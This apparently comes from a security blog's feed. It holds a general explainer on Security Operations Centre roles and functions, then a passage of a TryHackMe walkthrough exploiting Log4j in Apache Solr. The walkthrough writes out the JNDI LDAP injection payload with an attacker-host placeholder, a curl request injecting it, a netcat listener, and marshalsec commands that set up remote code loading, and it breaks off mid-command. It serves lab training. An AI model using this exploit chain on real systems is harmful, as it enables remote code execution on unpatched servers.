&lt;p&gt;While incident response consumes the majority of the SOC’s resources, the chief information security officer (CISO) is accountable for the overall risk and compliance picture. An effective strategy involves an adaptive security architecture that enables organisations to conduct optimum security operations to bridge operational and data silos across various activities. This method improves your information security management posture while increasing efficiency through integration, automation, and orchestration. It also minimises the number of personnel hours necessary.&lt;/p&gt;

&lt;p&gt;Adoption of a security framework that makes it easy to integrate security solutions and threat intelligence into day-to-day procedures is required for an efficient security operations model. Threat data is integrated into security monitoring dashboards and reports using SOC tools including consolidated and responsive dashboards, which keeps operations and management up to date on changing events and actions. SOC teams can better manage overall risk posture by connecting threat management with other tools for risk and compliance management. Such configurations provide continuous visibility across systems and domains, as well as the utilisation of actionable intelligence to improve security operations accuracy and consistency.&lt;/p&gt;</content><author><name>Thebyteman</name></author><category term="general" /><summary type="html">Security Operations Centre Security Operation is the continuous operational practice for maintaining and managing a secure IT environment through the Implementation and execution of certain services and process. Its main purpose is to detect, prevent, prioritize and respond to security incidents. Security Operation Consists of various security operation tasks, like: • Security Monitoring • Security Incident Management • Vulnerability Management • Security Device Management • Network flow Monitoring SOC is a centralized unit and a single point of view through which an organization’s assets are monitored, assessed, and defended from the threats. It also facilitates situational awareness and real-time alerting if any intrusion or attack is detected. It functions as a hub or central command post, collecting telemetry from across an organization’s IT infrastructure, including networks, devices, appliances, and data stores, regardless of where those assets are located. The proliferation of advanced threats involves gathering context from a variety of sources. Essentially, the SOC serves as a point of contact for all events logged within the organisation that are being monitored. The SOC must determine how each of these events will be managed and dealt with. Traditionally, SOCs have been built on a hub-and-spoke architecture, with a security information and event management (SIEM) system aggregating and correlating data from security feeds. Vulnerability assessment solutions, governance, risk, and compliance (GRC) systems, application and database scanners, intrusion prevention systems (IPS), user and entity behaviour analytics (UEBA), endpoint detection and remediation (EDR), and threat intelligence platforms (TIP) are all examples of spokes in this model . The SOC is typically led by a SOC manager and may include incident responders, SOC Analysts (levels 1, 2, and 3), threat hunters, and an incident response manager (s).The SOC reports to the CISO, who in turn reports to either the CIO or directly to the CEO. Roles in a SOC Department: Both the security technologies (e.g., software) and the individuals who make up the SOC team provide the “framework” for your security operations. Members of the SOC Team Include: Manager: The group’s leader can fill any function while also monitoring the security systems and processes. Analysts: They compile and analyse data from a specific time period (for example, the preceding quarter) or after a data breach. Investigator: After a breach, the investigator works closely with the responder to figure out what happened and why (typically, one individual serves as both investigator and responder). Responder: Responding to a security breach entails a number of responsibilities. During a crisis, someone who is familiar with these requirements is essential. Auditor: All current and future legislation includes compliance requirements. This position keeps track of these standards and ensures that your company meets them. Note: Depending on the size of an organization, one person may perform multiple roles listed. In some cases, it may come down to one or two people for the entire “team.” SOC capabilities Situational Awareness and operational intelligence - SOC provides information about what is going on across the different parts of IT infrastructure. It also provides Operational intelligence about IT infrastructure. Threat control and prevention - Using Internal and external resources, it provides the knowledge of IOC’S (Indicator of compromise) of attacks. This enables SOC to provide Threat control and prevention. Forensics - SOC analysts use structured log data to conduct investigation and understand the root cause of the attack and restrict the attacker’s ability to perform an attack against the organization. 10 key functions performed by the SOC: 1.Take Stock of Available Resources The SOC is in charge of two types of assets: the various devices, processes, and applications they are tasked with protecting, as well as the defensive tools at their disposal to assist in this protection. What The SOC Protects: The SOC cannot protect devices and data that are not visible to them. There are likely to be blind spots in the network security posture that can be discovered and exploited if visibility and control from device to cloud are not provided. As a result, the SOC’s goal is to obtain a comprehensive picture of the business’ threat landscape, which includes not only the various types of endpoints, servers, and software on premises, but also third-party services and traffic flowing between these assets. How The SOC Protects: The SOC should also have a thorough understanding of all cybersecurity tools available as well as all SOC workflows. This improves agility and enables the SOC to operate at maximum efficiency. 2.Preparation and Preventative Maintenance Even the most well-equipped and agile response processes are ineffective when it comes to preventing problems from occurring in the first place. The SOC implements preventative measures, which can be divided into two categories, to help keep attackers at bay. Preparation: Members of the team should stay up to date on the latest security advances, cybercrime trends, and the emergence of new dangers on the horizon. This study can be used to develop a security roadmap that will guide the company’s cybersecurity activities in the future, as well as a disaster recovery plan that will provide ready guidance in the event of a worst-case scenario. Preventative Maintenance: All activities done to make successful attacks more difficult, such as regularly maintaining and updating existing systems, updating firewall policies, patching vulnerabilities, and whitelisting, blacklisting, and securing apps, are included in this phase. 3.Continuous Proactive Monitoring The SOC’s tools scan the network 24 hours a day, seven days a week, looking for any anomalies or suspicious activity. The SOC can be warned of developing risks promptly by monitoring the network around the clock, providing them the best chance to avoid or mitigate harm. A SIEM or an EDR are examples of monitoring technologies. The most advanced of these can employ behavioural analysis to “teach” systems the difference between normal day-to-day operations and genuine threat behaviour, reducing the amount of triage and analysis required by people. 4.Alert Ranking and Management When monitoring tools send out alerts, it’s up to the SOC to examine each one carefully, delete any false positives, and decide how aggressive any actual threats are and what they might be targeting. This enables them to effectively prioritise emerging threats, addressing the most pressing concerns first. 5.Threat Response When most people think of the SOC, they think of these acts. The SOC responds as a first response as soon as an incident is confirmed, shutting down or isolating endpoints, stopping malicious programmes (or blocking them from executing), deleting files, and so on. The goal is to respond to the extent required while minimising the impact on company continuity. 6.Recovery and Remediation Following an incident, the SOC will try to restore systems and recover any data that has been lost or compromised. Wiping and restarting endpoints, restructuring systems, or, in the case of ransomware attacks, establishing valid backups are all possible ways to avoid the malware. This step, if completed successfully, will restore the network to its pre-incident state. 7.Log Management The SOC is in charge of gathering, maintaining, and reviewing all network activity and communications logs for the whole enterprise. This information helps create a baseline for “normal” network activity, can show the presence of risks, and can be utilised for post-incident remediation and forensics. Many SOCs employ a SIEM to collect and correlate data from applications, firewalls, operating systems, and endpoints, all of which generate their own logs. 8.Root Cause Analysis (RCA) Following an incident, the SOC is in charge of determining exactly what happened, when, how, and why. During this inquiry, the SOC will use log data and other information to trace the problem back to its source and create an RCA Report, which will aid in the prevention of future problems. 9.Security Refinement and Improvement Cybercriminals are continually improving their TTPs (Tools, Techniques and Procedures) and the SOC must keep up with them by implementing upgrades on a regular basis. The strategies established in the Security Road Map are brought to life in this step, but it can also involve hands-on techniques like red-teaming and purple-teaming. 10.Compliance Management Many of the SOC’s processes are guided by best practises, but others are driven by regulatory obligations. The SOC is in charge of auditing their systems on a regular basis to ensure compliance with any requirements imposed by their company, industry, or regulating authorities. GDPR, HIPAA, and PCI DSS are examples of these regulations. Acting in line with these regulations not only protects the sensitive data entrusted to the firm, but it also protects the company from reputational harm and legal problems that may arise as a result of a breach. Optimization of a SOC: While incident response consumes the majority of the SOC’s resources, the chief information security officer (CISO) is accountable for the overall risk and compliance picture. An effective strategy involves an adaptive security architecture that enables organisations to conduct optimum security operations to bridge operational and data silos across various activities. This method improves your information security management posture while increasing efficiency through integration, automation, and orchestration. It also minimises the number of personnel hours necessary. Adoption of a security framework that makes it easy to integrate security solutions and threat intelligence into day-to-day procedures is required for an efficient security operations model. Threat data is integrated into security monitoring dashboards and reports using SOC tools including consolidated and responsive dashboards, which keeps operations and management up to date on changing events and actions. SOC teams can better manage overall risk posture by connecting threat management with other tools for risk and compliance management. Such configurations provide continuous visibility across systems and domains, as well as the utilisation of actionable intelligence to improve security operations accuracy and consistency.</summary></entry><entry><title type="html">LOG4J-Solr-THM-Walkthrough</title><link href="http://localhost:4000/blog-walkthroughs/walkthroughs/2022/01/04/Log4j-THM-Walkthrough.html" rel="alternate" type="text/html" title="LOG4J-Solr-THM-Walkthrough" /><published>2022-01-04T17:03:35+05:30</published><updated>2022-01-04T17:03:35+05:30</updated><id>http://localhost:4000/blog-walkthroughs/walkthroughs/2022/01/04/Log4j-THM-Walkthrough</id><content type="html" xml:base="http://localhost:4000/blog-walkthroughs/walkthroughs/2022/01/04/Log4j-THM-Walkthrough.html">&lt;p&gt;The room for practicing Log4j can be found here: https://tryhackme.com/room/solar&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;no&quot;&gt;Phase&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Reconnaissance&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;We explore the web interface at http://machine_ip[:]8983; we explore and look around for the log files, to see which path or URL endpoint triggers the logging.&lt;/p&gt;

&lt;p&gt;We find that&lt;/p&gt;
&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;err&quot;&gt;“&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;solr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;admin&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cores&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;”&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;is where a user can control the data entry point.&lt;/p&gt;

&lt;p&gt;You may already know the general payload to abuse this log4j vulnerability.&lt;/p&gt;

&lt;p&gt;The format of the usual syntax that takes advantage of this looks like so: 
                ${jndi: ldap://ATTACKERCONTROLLEDHOST}&lt;/p&gt;

&lt;p&gt;This syntax indicates that the log4j will invoke functionality from “JNDI”, or the “Java Naming and Directory Interface.” Ultimately, this can be used to access external resources, or “references,” which is what is weaponized in this attack.&lt;/p&gt;

&lt;p&gt;Notice the ldap:// schema. This indicates that the target will reach out to an endpoint (an attacker controlled location, in the case of this attack) via the LDAP protocol. For now, know that the target will in fact make a connection to an external location. This is indicated by the 
ATTACKERCONTROLLEDHOST placeholder in the above syntax. You, acting as the attacker in this scenario, can host a simple listener to view this connection.&lt;/p&gt;

&lt;p&gt;We already discovered that we could supply parameter to the /solr/admin/cores URL to insert our JNDI Syntax.&lt;/p&gt;

&lt;p&gt;Other locations you might supply this JNDI syntax: 
•	Input boxes, user and password login forms, data entry points within applications 
•	HTTP headers such as User-Agent, X-Forwarded-For, or other customizable headers 
•	Any place for user-supplied data&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;no&quot;&gt;Phase&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Testing&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;To prepare your environment for testing the vulnerability and receiving a connection&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;We view our own IP address information: 
a.	“ip addr show” OR “ip -br -c a”&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;We prepare a netcat listener on port 9999&lt;br /&gt;
a.	“nc -nlvp 9999”&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Now that you have a listener staged, make a request including this primitive JNDI payload syntax as part of the HTTP parameters. This can easily be done with the curl command line utility.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;err&quot;&gt;“&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;curl&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;‘&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:/&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;machine_ip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[:]&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8983&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;solr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;admin&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cores?foo&lt;/span&gt;&lt;span class=&quot;vg&quot;&gt;$\&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;jndi&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:ldap:/&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Your&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;IP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;9999&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;\}&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;’&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Note, due to the use of the $ dollar-sign character in your syntax, you must ensure you wrap the URL within single-quotes, so bash (your command-line shell) does not interpret it as a variable. 
Additionally, you must escape out the { } curly braces with a single backslash character, so those are not misrepresented in the curl command arguments.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Verify you have received a connection by seeing the following message in your netcat listener: 
a.	“Connection received from MACHINE_IP”&lt;/li&gt;
&lt;/ol&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;no&quot;&gt;Phase&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Preparation&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Payload&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Creation&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;At this point, you have verified the target is in fact vulnerable by seeing this connection caught in your netcat listener. However, it made an LDAP request… so all your netcat listener may have seen was non-printable characters (strange looking bytes). We can now build upon this foundation to respond with a real LDAP Handler. We will utilize an open-source and public utility to stage an “LDAP Referral Server”. This will be used to essentially redirect the initial request of the victim to another location, where you can host a secondary payload that will ultimately run code on the target. This breaks down like so:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;	&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;jndi&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:ldap:/&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;attackerserver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1389&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Resource&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reaches&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;out&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;to&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;our&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;LDAP&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Referral&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Server&lt;/span&gt; 
&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;	&lt;span class=&quot;no&quot;&gt;LDAP&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Referral&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Server&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;springboards&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;the&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;to&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;secondary&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:/&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;attackerserver&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;resource&lt;/span&gt; 
&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;	&lt;span class=&quot;no&quot;&gt;The&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;victim&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;retrieves&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;executes&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;the&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;code&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;present&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:/&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;attackerserver&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;resource&lt;/span&gt; &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;This means we will need an HTTP server, which we could simply host with any of the following options (serving on port 8000):&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;	&lt;span class=&quot;err&quot;&gt;•&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;python3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;m&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;server&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8000&lt;/span&gt; &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;The first order of business however is obtaining the LDAP Referral Server. We will use the marshalsec utility offered at https://github.com/mbechler/marshalsec&lt;/p&gt;

&lt;p&gt;Ultimately, this needs to run Java. Reviewing the README for this utility, it suggests using Java 8. (You may or may not have success using a different version, but to “play by the rules,” we will match the same version of Java used on the target virtual machine)&lt;/p&gt;

&lt;p&gt;You can find a mirror of different Java versions to run on Linux at this location. http://mirrors.rootpei.com/jdk/ and we install Java 8 locally. 
Now we install Marshalsec utility from github.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Clone&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;the&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;repository&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;any&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;location&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;of&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;your&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;choice&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;I&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;would&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;suggest&lt;/span&gt; &lt;span class=&quot;sr&quot;&gt;/tmp or /o&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt; 
&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;git&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;clone&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;https&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:/&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;github&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;com&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mbechler&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;marshalsec&lt;/span&gt; 

&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;	&lt;span class=&quot;no&quot;&gt;Download&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;change&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;directories&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;into&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;this&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;folder&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cd&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;marshalsec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;We&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;must&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;build&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;marshalsec&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;the&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Java&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;builder&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;maven&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;If&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;you&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;yet&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;have&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;maven&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;on&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;your&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;you&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;can&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;install&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;it&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;through&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;your&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;package&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;manager: &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'sudo apt install maven'&lt;/span&gt;

&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;	&lt;span class=&quot;no&quot;&gt;Now&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;we&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;install&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;the&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;maven&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;packages:  &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'mvn clean package -DskipTests'&lt;/span&gt; 

&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;	&lt;span class=&quot;no&quot;&gt;With&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;the&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;marshalsec&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;utility&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;built&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;we&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;can&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;start&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;an&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;LDAP&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;referral&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;server&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;to&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;direct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;connections&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;to&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;our&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;secondary&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;HTTP&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;server&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;which&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;we&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;will&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;prepare&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;just&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;moment&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;The&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;syntax&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;to&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;start&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;the&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;LDAP&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;server&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;follows: 
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;java&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cp&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;marshalsec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;0.0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;SNAPSHOT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;all&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;jar&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;marshalsec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span 